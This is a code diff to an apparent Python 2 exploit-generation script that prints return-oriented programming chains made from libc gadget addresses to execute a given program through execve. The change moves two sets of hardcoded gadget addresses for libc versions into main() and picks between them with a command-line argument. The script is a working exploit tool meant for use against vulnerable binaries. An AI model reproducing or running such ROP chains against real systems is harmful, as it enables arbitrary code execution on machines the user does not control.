@@ -11,14 +11,14 @@ They've been tested on libc-2.15 and libc-2.17
 Please change only the relative addresses of the gadgets to the ones on the system to be exploited.
 """
 
-pop_ecx_pop_eax = 'ROP command: 0xf5160L: pop ecx ; pop eax ;;\\n'
-mov_eax_ecx = 'ROP command: 0x2e09fL: mov [eax] ecx ;;\\n'
-xor_eax_eax = 'ROP command: 0x34964L: xor eax eax ;;\\n'
-pop_ecx_pop_edx = 'ROP command: 0x2e8bbL: pop ecx ; pop edx ;;\\n'
-mov_edx_eax = 'ROP command: 0x113371L: mov [edx] eax ; xor eax eax ;;\\n'
-pop_ecx_pop_ebx = 'ROP command: 0xff102L: pop ecx ; pop ebx ;;\\n'
-add_eax_b = 'ROP command: 0x14da28L: add eax 0xb ;;\\n'
-call_gs_10 = 'ROP command: 0xbaa75L: call dword [gs:0x10]'
+pop_ecx_pop_eax = ''
+mov_eax_ecx = ''
+xor_eax_eax = ''
+pop_ecx_pop_edx = ''
+mov_edx_eax = ''
+pop_ecx_pop_ebx = ''
+add_eax_b = ''
+call_gs_10 = ''
 
 """
 @params
@@ -88,9 +88,39 @@ def gui_execve(path):
     print rop_code
 
 def main():
+
     if len(sys.argv) < 3:
         print 'Enter the path of the executable and if it\'s a GUI(1) or command line(2) application'
         sys.exit(1)
+
+    global pop_ecx_pop_eax
+    global mov_eax_ecx
+    global xor_eax_eax
+    global pop_ecx_pop_edx
+    global mov_edx_eax
+    global pop_ecx_pop_ebx
+    global add_eax_b
+    global call_gs_10
+
+    if len(sys.argv) == 4 and sys.argv[3] == 'kavya':
+        pop_ecx_pop_eax = 'ROP command: 0xf2d21L: pop ecx ; pop eax ;;\\n'
+        mov_eax_ecx = 'ROP command: 0x2d71fL: mov [eax] ecx ;;\\n'
+        xor_eax_eax = 'ROP command: 0x341a5L: xor eax eax ;;\\n'
+        pop_ecx_pop_edx = 'ROP command: 0x2df7bL: pop ecx ; pop edx ;;\\n'
+        mov_edx_eax = 'ROP command: 0x113371L: mov [edx] eax ; xor eax eax ;;\\n'
+        pop_ecx_pop_ebx = 'ROP command: 0xfca82L: pop ecx ; pop ebx ;;\\n'
+        add_eax_b = 'ROP command: 0x148428L: add eax 0xb ;;\\n'
+        call_gs_10 = 'ROP command: 0xb8dc5L: call dword [gs:0x10]'
+
+    else:
+        pop_ecx_pop_eax = 'ROP command: 0xf5160L: pop ecx ; pop eax ;;\\n'
+        mov_eax_ecx = 'ROP command: 0x2e09fL: mov [eax] ecx ;;\\n'
+        xor_eax_eax = 'ROP command: 0x34964L: xor eax eax ;;\\n'
+        pop_ecx_pop_edx = 'ROP command: 0x2e8bbL: pop ecx ; pop edx ;;\\n'
+        mov_edx_eax = 'ROP command: 0x113371L: mov [edx] eax ; xor eax eax ;;\\n'
+        pop_ecx_pop_ebx = 'ROP command: 0xff102L: pop ecx ; pop ebx ;;\\n'
+        add_eax_b = 'ROP command: 0x14da28L: add eax 0xb ;;\\n'
+        call_gs_10 = 'ROP command: 0xbaa75L: call dword [gs:0x10]'
 
     if int(sys.argv[2]) == 1:
     	gui_execve(sys.argv[1])
